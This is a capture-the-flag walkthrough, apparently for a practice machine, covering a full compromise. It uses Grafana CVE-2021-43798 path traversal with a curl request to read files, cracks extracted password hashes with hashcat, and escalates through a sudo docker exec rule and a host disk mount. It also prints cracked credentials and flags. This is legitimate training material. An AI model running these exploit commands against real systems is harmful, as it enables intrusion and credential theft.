
## CTF Writeup: Data

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.234.47
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 12:14 -0500
Nmap scan report for 10.129.234.47
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.89 seconds
```

The TCP Scan revealed SSH open & an Grafana Application on port 3000. Let's find out it's version. Upon displaying the application in the browser we are being greeted with version information of the Grafana Web Application. It's version is v8.0.0. Let's search for public exploits using searchsploit.

```
searchsploit grafana 8     
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                          | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read      | multiple/webapps/50581.py
Grafana <=6.2.4 - HTML Injection                                 | typescript/webapps/51073.txt
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

As we can see there is an vulnerability open in Grafana 8.3.0 "Directory Traversal and Arbitrary File Read". The discovered grafana interface could be vulnerable to this. Let's check it out.

The exploit didn't work so I decided to google for more public exploits for the CVE-2021-43798.

I wasn't able to find an working exploit, but I analyzed the exploit itself and found out where the path traversal vulnerability is.

Sending the following http request actually provided us with local file inclusion!

```
curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
```

Let's check out the default grafana path for the grafana database. Since there was no real user. 

I opened the sqlitebrowser to view the database file.

```
sqlitebrowser grafana.db
```

In the user column I retrieved two credentials, one for the "admin" user with an encoded password, and one for the user "boris".

```
admin@localhost:7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8:YObSoLj55S
```

```
boris@data.vl:dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8:LCBhdtJWjl
```

I'll format that into the input hash,salt for converting the encoded password and salt to hash.

```
7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8,YObSoLj55S
```

```
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```

Downloaded the following tool which converts grafana passwords and salts into hashcat format.

```
sudo git clone https://github.com/iamaldi/grafana2hashcat.git
```

I stored the encoded passwords with there salts inside an grafana_hashes.txt file. 

I then utilized grafana2hashcat.py in order to convert the encoded password into hashcat format.

```
python3 grafana2hashcat.py /ctfs/htb/linux/data/grafana_hashes.txt

[+] Grafana2Hashcat
[+] Reading Grafana hashes from:  /ctfs/htb/linux/data/grafana_hashes.txt
[+] Done! Read 2 hashes in total.
[+] Converting hashes...
[+] Converting hashes complete.
[*] Outfile was not declared, printing output to stdout instead.

sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=


[+] Now, you can run Hashcat with the following command, for example:

hashcat -m 10900 hashcat_hashes.txt --wordlist wordlist.txt
```

Started bruteforcing the encoded passwords with hashcat.

```
hashcat -m 10900 pw_hashes /usr/share/wordlists/rockyou.txt
```

Gained an password for the boris user.

```
boris:beautiful1
```

Successfully connected to the target server via SSH.

```
ssh boris@10.129.234.47                        
The authenticity of host '10.129.234.47 (10.129.234.47)' can't be established.
ED25519 key fingerprint is: SHA256:kKsFY4lOfr5Romb/aAy0GtkTZTFbOGC5rZwkh4dGx+s
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.234.47' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
boris@10.129.234.47's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Thu Sep 17 18:03:30 UTC 2026

  System load:  0.36              Processes:              208
  Usage of /:   38.0% of 4.78GB   Users logged in:        0
  Memory usage: 14%               IP address for eth0:    10.129.234.47
  Swap usage:   0%                IP address for docker0: 172.17.0.1


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

122 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 18.04 at
https://ubuntu.com/18-04


Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62
boris@data:~$
```

Retrieved user.txt in /home/boris directory.

```
a964b07a93c505a8c9c204cbb3c82c06
```

## Privilege Escalation

Inspected user "boris" sudo permissions.

```
sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
```

Being able to run the docker binary with root permissions is a big win. We can immediatly get root doing the following commands:

We can enumerate running docker containers like this.

```
docker ps
```

Unfortunately this didn't work.

We can still check the running processes and see an active docker instance.

```
ps auxww | grep docker
```

```
There's an ID for a running container, e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81.
```

The docker exec subcommand takes a container and a command, and has several options:

We can get shell on a running container executing the following command: 

```
docker exec -it <container name> bash
```

But since we want the highest privileges possible on the docker image, let's get root by running the following command:

```
/snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```

We now got root permissions on the docker container. In order to be able to get the root.txt we need to somehow break out the container! 

An classic way to break out an container is simply by checking for mounted devices.

```
mount
```

There is nothing interesting, but let's maybe check on the host system, by closing our docker root session and going back to our ssh session with user "boris".

```
mount
```

This actually revealed /dev/sda1 being mounted onto the root filesystem /. Let's mount /dev/sda1 into the docker container in /mnt. Why? Since the entire filesystem of the server is mounted to this hard disk, we can get access to the root directory inside the docker container.

Navigating back to the container itself.

```
sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash
```

Mounted the harddisk in which the entire filesystem of the host system is mounted into the docker container.

```
mount /dev/sda1 /mnt/
```

We now got the whole file system in /mnt directory and can access the /root's directory!

Retrieved /root.txt in /mnt/root/ directory on the docker container.

```
83ce94e9c0bdcc352434fd0e931ecf9a
```